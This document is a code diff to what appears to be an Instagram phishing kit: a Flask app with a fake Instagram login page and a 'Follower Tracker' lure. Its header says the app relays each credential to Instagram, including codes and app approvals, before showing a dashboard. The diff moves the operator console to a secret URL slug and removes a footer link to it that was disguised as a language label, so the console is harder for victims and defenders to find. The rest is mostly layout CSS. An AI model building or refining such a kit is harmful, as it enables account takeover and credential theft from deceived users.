@@ -5,9 +5,13 @@ Login is strict on purpose: the dashboard only opens when Instagram itself
 confirms the credential (ok / code / approve). Timeouts, denials and account
 mismatches keep the visitor on the login page — no fake dashboard.
 
+The console is never linked from the visitor UI. Point ADMIN_PATH at a secret
+slug and /admin stops existing entirely.
+
 Env:
   SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
   ADMIN_TOKEN        console password             (unset = open, dev only)
+  ADMIN_PATH         secret console slug          (default "admin" -> /admin)
   DATA_DIR           sqlite + log directory       (default ./data)
   GEO                1 to enable IP geo lookup    (default off)
   GEO_TIMEOUT        geo lookup timeout, seconds  (default 1.2)
@@ -65,6 +69,7 @@ import ig
 
 # ============================== config ==============================
 ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
+ADMIN_BASE = "/" + (os.environ.get("ADMIN_PATH", "admin").strip().strip("/") or "admin")
 DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
 GEO_ENABLED = os.environ.get("GEO", "0") == "1"
 GEO_TIMEOUT = float(os.environ.get("GEO_TIMEOUT", "1.2"))
@@ -799,31 +804,35 @@ LOGIN_PAGE_HTML = """
 }
 *{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
 html{height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}
+html,body{min-height:100%}
 
 body{
-  position:fixed;inset:0;height:var(--vh,100dvh);
-  overflow:hidden;overscroll-behavior:none;touch-action:manipulation;
+  min-height:var(--vh,100dvh);
+  overflow-x:hidden;overflow-y:auto;overscroll-behavior-y:contain;
+  touch-action:manipulation;
   background:var(--bg);color:var(--tx);
   font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-  display:flex;justify-content:center;
+  display:flex;justify-content:center;align-items:stretch;
   transition:background .5s var(--e),color .5s var(--e);
 }
 body::before{
-  content:"";position:absolute;inset:0;pointer-events:none;
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
   background:radial-gradient(72% 55% at 50% 0,var(--glow),transparent 72%);
   animation:breathe 9s ease-in-out infinite;
 }
 @keyframes breathe{0%,100%{opacity:.65}50%{opacity:1}}
 
 .app{
-  position:relative;width:100%;max-width:420px;height:100%;
+  position:relative;z-index:1;
+  width:100%;max-width:420px;min-height:var(--vh,100dvh);
   display:flex;flex-direction:column;
-  padding:calc(env(safe-area-inset-top,0px) + 10px) 24px calc(env(safe-area-inset-bottom,0px) + 10px);
+  padding:calc(env(safe-area-inset-top,0px) + 10px) 24px
+          calc(env(safe-area-inset-bottom,0px) + 10px);
   animation:pg .8s var(--e) both;
 }
 
 .content{
-  flex:1;min-height:0;display:flex;
+  flex:1 1 auto;min-height:0;display:flex;
   overflow-y:auto;overscroll-behavior:contain;
   scrollbar-width:none;-webkit-overflow-scrolling:touch;
   padding-bottom:14px;
@@ -906,13 +915,11 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 .create button:hover{background:rgba(0,149,246,.08);box-shadow:0 10px 24px -12px rgba(0,149,246,.7)}
 .create button:active{transform:scale(.97)}
 
-.bottom{flex:none;position:relative;z-index:2;text-align:center;padding-top:6px;
+.bottom{flex:none;position:relative;text-align:center;padding-top:6px;
   animation:up .65s .5s var(--e) backwards}
 .meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
 .meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
 .footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:2px}
-.footer a{color:var(--mut);text-decoration:none;border-bottom:1px dotted var(--line);transition:color .25s,border-color .25s}
-.footer a:hover{color:var(--blue);border-color:var(--blue)}
 
 .rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.5);transform:scale(0);
   animation:rip .65s ease-out forwards;pointer-events:none}
@@ -943,6 +950,26 @@ body.busy .veil{opacity:1;pointer-events:auto}
 @keyframes sweep{0%{left:-60%}42%,100%{left:135%}}
 @keyframes shake{10%,90%{transform:translateX(-2px)}20%,80%{transform:translateX(4px)}
   30%,50%,70%{transform:translateX(-7px)}40%,60%{transform:translateX(7px)}}
+
+/* landscape phones: keep everything reachable, no clipped CTA */
+@media (max-height:520px){
+  .logo{width:56px;height:56px;margin-bottom:14px}
+  .logo img{width:50px;height:50px}
+  .language{margin-bottom:12px}
+  .create{margin-top:16px}
+  .bottom{padding-top:10px}
+}
+
+/* wide screens: a centred card instead of a stretched column */
+@media (min-width:560px){
+  body{padding:24px 0;align-items:center}
+  .app{
+    max-width:404px;min-height:min(660px,calc(var(--vh,100dvh) - 48px));
+    border:1px solid var(--line);border-radius:22px;
+    box-shadow:0 26px 64px -28px rgba(0,0,0,.4);
+    padding-top:30px;padding-bottom:30px;
+  }
+}
 
 @media (prefers-reduced-motion:reduce){
   *,*::before,*::after{animation:none!important;transition:none!important}
@@ -994,8 +1021,7 @@ body.busy .veil{opacity:1;pointer-events:auto}
         </div>
 
         <div class="footer">
-            &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms
-            &middot; <a href="/console" target="_blank" rel="noopener">English (UK)</a>
+            &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms &middot; English (UK)
         </div>
     </div>
 
@@ -1260,16 +1286,30 @@ RESULTS_PAGE_HTML = """
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Insight — Follower Tracker</title>
 <style>
-:root{--bg:#fff;--bg2:#fff;--card:#fafafa;--line:#dbdbdb;--tx:#000;--mut:#737373;--chip:#efefef;--blue:#0095f6;--red:#ed4956;--ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);--glow:rgba(214,41,118,.10);--e:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.2,1.5,.4,1);--sh:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.05);--sh2:0 2px 4px rgba(0,0,0,.05),0 18px 44px rgba(0,0,0,.13);box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+:root{--bg:#fff;--bg2:#fff;--card:#fafafa;--line:#dbdbdb;--tx:#000;--mut:#737373;--chip:#efefef;--blue:#0095f6;--red:#ed4956;--ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);--glow:rgba(214,41,118,.10);--e:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.2,1.5,.4,1);--sh:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.05);--sh2:0 2px 4px rgba(0,0,0,.05),0 18px 44px rgba(0,0,0,.13)}
 @media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}}
 :root[data-theme="dark"]{--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}
 *{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
-html{scroll-behavior:smooth}
-body{background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;overflow:hidden;font-variant-numeric:tabular-nums;transition:background .5s var(--e),color .5s var(--e)}
-.frame{container-type:inline-size;position:relative;width:100%;flex:1;min-height:0;max-width:1240px;margin:10px 16px 16px;border:1px solid var(--line);border-radius:22px;overflow:hidden;background:var(--bg2);box-shadow:var(--sh2);transition:max-width .6s var(--e),border-radius .6s var(--e),background .5s,border-color .5s}
-.app{display:grid;grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto;height:100%}
-.side{grid-row:1/4;border-right:1px solid var(--line);padding:24px 12px 20px;display:flex;flex-direction:column;overflow:auto;transition:border-color .5s}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  height:var(--vh,100dvh);min-height:var(--vh,100dvh);
+  background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  display:flex;align-items:stretch;justify-content:center;
+  overflow:hidden;overscroll-behavior:none;
+  font-variant-numeric:tabular-nums;
+  transition:background .5s var(--e),color .5s var(--e);
+}
+.frame{
+  position:relative;width:100%;height:100%;max-width:1240px;min-height:0;
+  border:0;border-radius:0;overflow:hidden;background:var(--bg2);
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+  transition:max-width .6s var(--e),border-radius .6s var(--e),background .5s,border-color .5s;
+}
+.app{display:grid;grid-template-columns:1fr;grid-template-rows:auto 1fr auto;height:100%;min-height:0}
+.side{grid-row:1/4;border-right:1px solid var(--line);padding:24px 12px 20px;display:none;flex-direction:column;overflow:auto;transition:border-color .5s}
 .logo{font:italic 700 30px Georgia,"Times New Roman",serif;letter-spacing:-.5px;padding:6px 12px 26px;text-align:center}
 .logo span{background:var(--ig);background-size:220% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 8s ease-in-out infinite alternate}
 @keyframes sh{to{background-position:100% 0}}
@@ -1288,33 +1328,34 @@ body{background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);font-f
 .me{margin-top:auto;display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;transition:background .3s}
 .me:hover{background:var(--chip)}
 .me b{font-size:14px;display:block;font-weight:600}.me small{color:var(--mut);font-size:12px}
-.mtop{display:none;grid-column:1;grid-template-columns:1fr auto 1fr;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);backdrop-filter:blur(24px) saturate(180%);background:color-mix(in srgb,var(--bg) 80%,transparent)}
+.mtop{display:grid;grid-column:1;grid-template-columns:1fr auto 1fr;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);backdrop-filter:blur(24px) saturate(180%);background:color-mix(in srgb,var(--bg) 80%,transparent)}
 .mtop .logo{padding:0;font-size:27px}
 .mtop svg{width:25px;height:25px}
 #mh{justify-self:end;border:0;background:none;color:var(--tx);cursor:pointer;display:grid;place-items:center;padding:2px;transition:transform .6s var(--spring)}
 #mh:hover{transform:rotate(90deg)}
-main{grid-row:1/4;overflow:auto;position:relative;scroll-behavior:smooth}
-.in{max-width:780px;margin:0 auto;padding:34px 28px 50px;position:relative}
+main{grid-row:2;overflow-y:auto;overflow-x:hidden;position:relative;min-height:0;overscroll-behavior:contain;-webkit-overflow-scrolling:touch}
+.in{max-width:780px;margin:0 auto;padding:20px 16px 40px;position:relative}
 .in.pg{animation:pg .55s var(--e) both}
 .in.swap{animation:swap .4s var(--e) both}
 @keyframes pg{from{opacity:0;transform:translateY(16px) scale(.99);filter:blur(6px)}}
 @keyframes swap{from{opacity:0;transform:translateY(10px) scale(.995);filter:blur(6px)}}
 main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;background:radial-gradient(60% 100% at 50% 0,var(--glow),transparent);pointer-events:none}
-.prof{display:flex;gap:34px;align-items:center;margin-bottom:26px}
+.prof{display:flex;gap:18px;align-items:center;margin-bottom:22px;flex-wrap:wrap}
 .ring{flex:none;border-radius:50%;padding:3px;background:var(--ig);position:relative;transition:transform .5s var(--spring),box-shadow .5s var(--e)}
 .ring>span{display:grid;place-items:center;border-radius:50%;border:3px solid var(--bg2);color:#fff;font-weight:700;overflow:hidden}
-.ring.l{width:116px;height:116px;box-shadow:0 10px 30px var(--glow)}.ring.l>span{width:100%;height:100%;font-size:32px}
+.ring.l{width:84px;height:84px;box-shadow:0 10px 30px var(--glow)}.ring.l>span{width:100%;height:100%;font-size:24px}
 .ring.l:hover{transform:rotate(9deg) scale(1.07);box-shadow:0 16px 44px rgba(214,41,118,.4)}
 .ring.m{width:54px;height:54px;padding:2.5px}.ring.m>span{width:100%;height:100%;border-width:2.5px;font-size:15px}
 .ring.s{width:46px;height:46px;padding:2.5px}.ring.s>span{width:100%;height:100%;border-width:2.5px;font-size:14px}
 .ring.off{background:var(--line)}
 .ring.off>span{background:var(--chip);color:var(--mut)}
-.pi{flex:1;min-width:0}
-.pi .h{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px}
-.pi h2{font:400 20px inherit;word-break:break-all}
-.pi .st{display:flex;gap:34px;margin-bottom:14px;font-size:15px}
+.pi{flex:1 1 160px;min-width:0}
+.pi .h{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px}
+.pi h2{font:400 17px inherit;word-break:break-word}
+.pi .st{display:flex;gap:0;justify-content:space-between;margin:12px 0 0;font-size:13px;text-align:center;border-top:1px solid var(--line);padding-top:12px}
+.pi .st div{display:flex;flex-direction:column;flex:1}
 .pi .st b{font-weight:700}
-.pi p{font-size:14px;line-height:1.45}.pi p span{color:var(--mut)}
+.pi p{font-size:13.5px;line-height:1.45;margin-top:12px}.pi p span{color:var(--mut)}
 .btn{position:relative;overflow:hidden;border:0;border-radius:10px;padding:8px 18px;font:600 14px inherit;cursor:pointer;background:var(--blue);color:#fff;box-shadow:0 4px 14px rgba(0,149,246,.32);transition:transform .45s var(--spring),filter .2s,box-shadow .35s var(--e),background .3s;white-space:nowrap}
 .btn:hover{filter:brightness(1.08);transform:translateY(-2px) scale(1.03);box-shadow:0 10px 22px -8px rgba(0,149,246,.7)}
 .btn:active{transform:scale(.94);box-shadow:none}
@@ -1325,19 +1366,19 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .btn.r{background:var(--chip);color:var(--red)}
 .rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.45);transform:scale(0);animation:rip .6s ease-out forwards;pointer-events:none}
 @keyframes rip{to{transform:scale(2.6);opacity:0}}
-.sec{display:flex;align-items:baseline;justify-content:space-between;margin:26px 0 14px}
+.sec{display:flex;align-items:baseline;justify-content:space-between;margin:22px 0 12px}
 .sec h3{font:700 15px inherit}.sec a{color:var(--blue);font:600 13px inherit;cursor:pointer;transition:letter-spacing .3s var(--e),opacity .2s}.sec a:hover{letter-spacing:.5px;opacity:.8}
-.stories{display:flex;gap:18px;overflow:auto;padding:8px 6px 10px;scrollbar-width:none}
+.stories{display:flex;gap:16px;overflow-x:auto;padding:8px 4px 10px;scrollbar-width:none}
 .stories::-webkit-scrollbar{display:none}
-.stories>div{flex:none;width:68px;text-align:center;cursor:pointer;position:relative;transition:transform .5s var(--spring);animation:up .6s var(--e) both}
+.stories>div{flex:none;width:66px;text-align:center;cursor:pointer;position:relative;transition:transform .5s var(--spring);animation:up .6s var(--e) both}
 .stories>div:nth-child(2){animation-delay:.06s}.stories>div:nth-child(3){animation-delay:.12s}.stories>div:nth-child(4){animation-delay:.18s}.stories>div:nth-child(5){animation-delay:.24s}
 .stories>div:hover{transform:translateY(-5px) scale(1.08)}
-.stories .ring{margin:0 auto 7px;width:68px;height:68px}.stories .ring>span{width:100%;height:100%;font-size:19px}
+.stories .ring{margin:0 auto 7px;width:66px;height:66px}.stories .ring>span{width:100%;height:100%;font-size:19px}
 .stories small{font-size:12px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .stories em{position:absolute;top:0;right:0;background:var(--red);color:#fff;font:700 10.5px/18px inherit;min-width:18px;border-radius:9px;border:2px solid var(--bg2);box-sizing:content-box;padding:0 3px;font-style:normal}
 @keyframes up{from{opacity:0;transform:translateY(18px) scale(.985);filter:blur(5px)}}
-.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
-.card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px 18px;cursor:pointer;box-shadow:var(--sh);
+.cards{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
+.card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:14px;cursor:pointer;box-shadow:var(--sh);
   transform:perspective(700px) rotateX(var(--rx,0deg)) rotateY(var(--ry,0deg));
   transition:transform .4s var(--e),box-shadow .45s var(--e),border-color .3s;
   animation:up .7s var(--e) both;will-change:transform}
@@ -1350,18 +1391,18 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .card:hover{box-shadow:var(--sh2);transform:perspective(700px) translateY(-6px) rotateX(var(--rx,0deg)) rotateY(var(--ry,0deg))}
 .card:hover::before,.card:hover::after{opacity:1}
 .card:active{transform:perspective(700px) translateY(-1px) scale(.985)}
-.card small{color:var(--mut);font-size:12.5px;display:flex;align-items:center;justify-content:space-between}
-.card small svg{width:18px;height:18px;transition:transform .5s var(--spring)}
+.card small{color:var(--mut);font-size:12px;display:flex;align-items:center;justify-content:space-between;gap:6px}
+.card small svg{width:18px;height:18px;flex:none;transition:transform .5s var(--spring)}
 .card:hover small svg{transform:scale(1.3) rotate(-12deg);color:var(--tx)}
-.card b{display:block;font:700 28px inherit;letter-spacing:-.8px;margin:8px 0 2px}
-.card i{font-style:normal;font-size:12px;color:var(--mut)}
+.card b{display:block;font:700 24px inherit;letter-spacing:-.8px;margin:8px 0 2px}
+.card i{font-style:normal;font-size:11.5px;color:var(--mut)}
 .card i.up{color:#2ecc71}.card i.dn{color:var(--red)}
 @keyframes spin{to{transform:rotate(1turn)}}
-.two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.two{display:grid;grid-template-columns:1fr;gap:12px}
 .panel{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e);animation:up .75s .2s var(--e) both}
 .panel:hover{transform:translateY(-4px);box-shadow:var(--sh2)}
 .panel h4{font:600 13.5px inherit;margin-bottom:16px}
-.donut{display:flex;align-items:center;gap:20px}
+.donut{display:flex;align-items:center;gap:20px;flex-wrap:wrap}
 .donut svg{width:104px;height:104px;flex:none;transition:transform .7s var(--spring)}
 .panel:hover .donut svg{transform:rotate(14deg) scale(1.06)}
 .donut circle:not(:first-child){animation:dr 1.2s .3s var(--e) both}
@@ -1372,22 +1413,22 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;animation:g .95s both var(--spring);transition:filter .3s,transform .4s var(--e)}
 .spark i:hover{filter:brightness(1.15) saturate(1.3);transform:scaleY(1.09)}
 @keyframes g{from{transform:scaleY(0)}}
-.sl{display:flex;gap:8px;margin-top:8px;font-size:11px;color:var(--mut)}.sl span{flex:1;text-align:center}
+.sl{display:flex;gap:8px;margin-top:8px;font-size:11px;color:var(--mut)}.sl span{flex:1;text-align:center;overflow:hidden;text-overflow:ellipsis}
 .bar{display:flex;gap:8px;margin:6px 0 14px;flex-wrap:wrap;align-items:center}
-.search{flex:1;min-width:150px;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .35s var(--e),background .3s,transform .45s var(--spring)}
+.search{flex:1 1 150px;min-width:0;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .35s var(--e),background .3s,transform .45s var(--spring)}
 .search:focus{background:var(--bg2);box-shadow:0 0 0 2px var(--blue),0 10px 26px -12px rgba(0,149,246,.7);transform:translateY(-1px)}
 .search::placeholder{color:var(--mut)}
 .chip{position:relative;overflow:hidden;border:0;background:var(--chip);color:var(--tx);padding:9px 15px;border-radius:10px;font:600 13px inherit;cursor:pointer;transition:all .4s var(--spring)}
 .chip:hover{transform:translateY(-2px);box-shadow:0 8px 16px -6px rgba(0,0,0,.2)}
 .chip:active{transform:scale(.94)}
 .chip.on{background:var(--tx);color:var(--bg)}
-.ttl{font:700 24px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 20px}
+.ttl{font:700 21px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 18px}
 .row{display:flex;align-items:center;gap:13px;padding:9px 10px;margin:0 -10px;border-radius:14px;animation:in .55s var(--e) both;transition:background .3s,transform .45s var(--spring),box-shadow .4s var(--e)}
 .row:hover{background:var(--chip);transform:translateX(6px)}
 .row:hover .ring{transform:scale(1.09)}
 @keyframes in{from{opacity:0;transform:translateY(12px);filter:blur(4px)}}
 .info{flex:1;min-width:0}
-.info b{font:600 14px inherit;display:flex;align-items:center;gap:5px}
+.info b{font:600 14px inherit;display:flex;align-items:center;gap:5px;flex-wrap:wrap}
 .info small{display:block;color:var(--mut);font-size:13px;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .vf{width:14px;height:14px;fill:var(--blue);flex:none}
 .tag{font:600 11px inherit;padding:3px 8px;border-radius:6px;background:var(--chip);color:var(--mut)}
@@ -1398,7 +1439,7 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .th{width:44px;height:44px;border-radius:8px;flex:none;transition:transform .45s var(--e)}
 .row:hover .th{transform:scale(1.1) rotate(5deg)}
 .day{font:700 15px inherit;margin:18px 0 6px}
-.bn{display:none;grid-column:1;grid-template-columns:repeat(5,1fr);border-top:1px solid var(--line);background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(24px) saturate(180%);padding:6px 4px calc(8px + env(safe-area-inset-bottom,0px))}
+.bn{display:grid;grid-column:1;grid-template-columns:repeat(5,1fr);border-top:1px solid var(--line);background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(24px) saturate(180%);padding:6px 4px calc(8px + env(safe-area-inset-bottom,0px))}
 .bn button{border:0;background:none;color:var(--tx);display:grid;place-items:center;padding:10px 0;cursor:pointer;position:relative;transition:transform .4s var(--spring)}
 .bn button:active{transform:scale(.82)}
 .bn svg{width:26px;height:26px;transition:transform .45s var(--spring)}
@@ -1419,52 +1460,40 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .sw.on::after{transform:translateX(18px)}
 .sw.on:active::after{transform:translateX(13px)}
 .acc{display:flex;align-items:center;gap:14px;padding:16px;background:var(--card);border:1px solid var(--line);border-radius:18px;margin-bottom:4px;box-shadow:var(--sh);animation:up .6s var(--e) both}
-.toast{position:fixed;left:50%;bottom:34px;transform:translate(-50%,30px) scale(.9);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .6s var(--spring);z-index:9;box-shadow:var(--sh2)}
+.toast{position:fixed;left:50%;bottom:calc(34px + env(safe-area-inset-bottom,0px));transform:translate(-50%,30px) scale(.9);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .6s var(--spring);z-index:9;box-shadow:var(--sh2);max-width:calc(100% - 32px);text-align:center}
 .toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
-.sk{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;height:98px}
+.sk{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;height:96px}
 .sk::after{content:"";position:absolute;inset:0;transform:translateX(-100%);
   background:linear-gradient(100deg,transparent 20%,color-mix(in srgb,var(--tx) 9%,transparent) 50%,transparent 80%);
   animation:shim 1.5s infinite}
 @keyframes shim{to{transform:translateX(100%)}}
-.sk.top{height:116px;width:116px;border-radius:50%;margin:0 auto 18px}
-.skw{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:22px}
-@container (max-width:760px){
- .app{grid-template-columns:1fr}
- .side{display:none}
- .mtop{display:grid}
- .bn{display:grid}
- main{grid-row:2}
- .in{padding:18px 16px 28px}
- .prof{gap:20px;align-items:flex-start;flex-wrap:wrap}
- .ring.l{width:84px;height:84px}.ring.l>span{font-size:24px}
- .pi{flex:1 1 150px}
- .pi .st{gap:0;justify-content:space-between;margin:14px 0 0;order:5;flex-basis:100%;text-align:center;border-top:1px solid var(--line);padding-top:12px;font-size:13px}
- .pi .st div{display:flex;flex-direction:column}
- .pi h2{font-size:17px}
- .cards{grid-template-columns:repeat(2,1fr);gap:10px}
- .card{padding:14px}.card b{font-size:24px}
- .two{grid-template-columns:1fr}
- .ttl{font-size:21px}
- .skw{grid-template-columns:repeat(2,1fr)}
-}
-@media (max-width:760px){
-  body{align-items:stretch}
-  .frame,.frame.mobile{width:100%;margin:0;border:0;border-radius:0;max-width:none;box-shadow:none}
-  .app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto}
-  .side{display:none}
-  .mtop{display:grid}
-  .bn{display:grid}
-  main{grid-row:2}
-}
+.sk.top{height:84px;width:84px;border-radius:50%;margin:0 auto 18px}
+.skw{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-top:22px}
+
+/* desktop: side rail + wider grid, framed card */
 @media (min-width:761px){
-  body{padding:0 16px}
-  .frame{width:100%;margin:10px auto 16px}
+  body{padding:16px}
+  .frame{max-height:calc(var(--vh,100dvh) - 32px);border:1px solid var(--line);border-radius:22px;box-shadow:var(--sh2)}
   .app{grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto}
   .side{display:flex}
   .mtop{display:none}
   .bn{display:none}
   main{grid-row:1/4}
+  .in{max-width:820px;padding:34px 28px 50px}
+  .prof{gap:30px;flex-wrap:nowrap;margin-bottom:26px}
+  .ring.l{width:112px;height:112px}.ring.l>span{font-size:31px}
+  .pi{flex:1 1 auto}
+  .pi h2{font-size:20px}
+  .pi .st{justify-content:flex-start;gap:34px;border-top:0;padding-top:0;margin:0 0 14px;font-size:15px}
+  .pi .st div{flex:0 0 auto}
+  .pi p{margin-top:0;font-size:14px}
+  .cards{grid-template-columns:repeat(3,1fr);gap:12px}
+  .card{padding:16px 18px}.card b{font-size:28px}
+  .two{grid-template-columns:1fr 1fr;gap:12px}
+  .ttl{font-size:24px}
+  .sec{margin:26px 0 14px}
 }
+
 @media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
 </style>
 </head>
@@ -1481,6 +1510,14 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 </div></div>
 <div class="toast" id="toast"></div>
 <script>
+(function(){
+  var vv=window.visualViewport, fr=document.documentElement;
+  function vs(){ fr.style.setProperty("--vh",(vv?vv.height:window.innerHeight)+"px"); }
+  vs();
+  if(vv){vv.addEventListener("resize",vs);vv.addEventListener("scroll",vs);}
+  window.addEventListener("resize",vs);
+  window.addEventListener("orientationchange",function(){setTimeout(vs,180)});
+})();
 const S=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
 const I={
  home:S('<path d="M3 10.5 12 3l9 7.5V21h-6v-6H9v6H3z"/>'),
@@ -1493,7 +1530,6 @@ const I={
  chat:S('<path d="M21 12a8 8 0 0 1-11.7 7L3 21l2-5.5A8 8 0 1 1 21 12z"/>'),
  out:S('<path d="M9 4H4v16h5M16 8l4 4-4 4M20 12H9"/>'),
  plus:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M19 8v6M16 11h6"/>'),
- cookie:S('<path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5z"/><circle cx="9" cy="10" r=".8"/><circle cx="13.5" cy="14.5" r=".8"/><circle cx="9.5" cy="15.5" r=".8"/>'),
  set:S('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>'),
  refresh:S('<path d="M21 12a9 9 0 1 1-3-6.7M21 3v6h-6"/>')
 };
@@ -1604,7 +1640,7 @@ function loadingView(){
  const m={queued:"Starting…",login:"Logging in to Instagram…",sync:"Loading your followers…",approve:"Approve the login in the Instagram app"}[PHASE]||"Loading…";
  if(PHASE==="error")return `<div class="empty" style="padding-top:70px"><div class="ttl">Login not confirmed</div><p class="sub">${ESC(ERR||"Unknown error")}</p><button class="btn" id="retry">Try again</button><p class="sub" style="margin-top:18px"><a href="/logout">Use another account</a></p></div>`;
